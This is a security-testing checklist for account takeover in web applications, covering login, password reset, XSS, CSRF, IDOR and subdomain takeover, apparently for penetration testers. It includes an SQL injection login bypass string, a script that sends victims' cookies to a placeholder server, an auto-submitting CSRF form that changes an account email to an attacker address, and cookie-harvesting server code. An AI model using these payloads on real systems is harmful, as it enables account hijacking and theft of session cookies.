## Account Takeover Checklist

- login:
    - [ ] check if you are able to brute force the password

    - [ ] Test for OAuth misconfigurations

    - [ ] check if you are able to bruteforce the login OTP

    - [ ] check for JWT mesconfigurations

    - [ ] Test for SQL injection to bypass authentication

        ```admin" or 1=1;--```
    - [ ] check if the application validates the OTP or Token

- password reset:
    - [ ] check if you are able to brute force the password reset OTP

    - [ ] test for token predectability

    - [ ] test for JWT misconfigurations

    - [ ] check if the password reset endpoint is vulnerable to IDOR

    - [ ] check if the password reset endpoint is vulnerable to Host Header injection

    - [ ] check if the password reset endpoint is leaking the token or OTP in the HTTP response

    - [ ] check if the application validates the OTP or Token

- XSS to Account Takeover
    - [ ] if the application does not use auth token or you can't access the cookies because the "HttpOnly" flag, you can obtain the CSRF token and craft a request to change the user's email or password       

    - [ ] try to exfiltrate the cookies

    - [ ] try to exfiltrate the Auth Token

    - [ ] if the cookie's "domain" attribute is set, search for xss in the subdomains and use it to exfiltrate the cookies

    - PoC Example:
        ```html
        <script>
            /*
            this script will create a hidden <img> element
            when the browser tries to load the image
            the victim's cookies will be sent to your server
            */

            var new_img = document.createElement('img');
            new_img.src = "http://yourserver/" + document.cookie;
            new_img.style = 'display: none;'
            document.body.appendChild(new_img);
        </script>

        ```

- CSRF to Account Takeover

    - [ ] check if the email update endpoint is vulnerable to CSRF

    - [ ] check if the password change endpoint is vulnerable to CSRF

    - PoC Example:
        ```html
            <html>
                <head>
                    <title>CSRF PoC</title>    
                <head>
                <body>
                    <form name='attack' action='https://example.com/update-email' method='POST'>
                        <input type="hidden" name="new_email" value="attacker@evil.com">
                        <input type="submit" name="submit" value="submit" hidden>
                    <form>
                    <script>
                        document.attack.submit.click()
                    </script>
                </body>
            </html>
        ```

- IDOR to Account Takerover

    - [ ] checck if the email update endpoint is vulnerable to IDOR

    - [ ] check if the password change endpoint is vulnerable to IDOR

    - [ ] check if the password reset endpoint vulnerable to IDOR

- subdomain takeover:
    - [ ] first-order: check if you can takeover xyz.example.com, you can host any malicious code to steal users info or cookies
    - PoC Example
        ```python
        #!/usr/bin/python3
        from flask import *

        app = Flask(__name__)

        @app.route('/')
        def cookie_sniffer():
            for c_name, c_value in request.cookies.items():
                print(c_name + ': ' + c_value)
            return 'Hello, world'
        if __name__ == '__main__':
            app.run(port=80)
        ```
    - [ ] second-order (broken link hijacking): if you found a broken link in a webpage (https://nonexistentlink.com/app.js) and you can takeover this domain, you can host any malicious javascript file and use it to steal users info or cookies
    - PoC Example
        ```javascript
        user_cookies = {
            "cookies": document.cookie
        }

        var xhttp = new XMLHttpRequest();
        xhttp.open("POST", "/store-cookies", true);
        xhttp.send(JSON.stringify(user_cookies));
        ```
